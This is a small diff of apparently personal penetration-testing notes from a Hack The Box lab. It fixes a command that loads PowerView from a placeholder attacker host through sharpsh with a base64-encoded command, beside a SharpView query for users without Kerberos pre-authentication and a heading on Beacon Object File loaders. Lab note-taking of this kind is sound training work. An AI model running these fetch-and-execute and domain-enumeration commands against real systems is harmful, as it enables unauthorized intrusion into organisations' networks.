@@ -5,7 +5,7 @@ execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired"
 - get-domain
 - base64 encode a Powerview command and execute
 ```bash
-sharpsh '-u http://attackerip:port/PowerVoiew.ps1 -e -c <base64>'
+sharpsh -- '-u http://attackerip:port/PowerView.ps1 -e -c <base64>'
 ```
 ## coff loaders (Beacon Object Files)
 from the armory
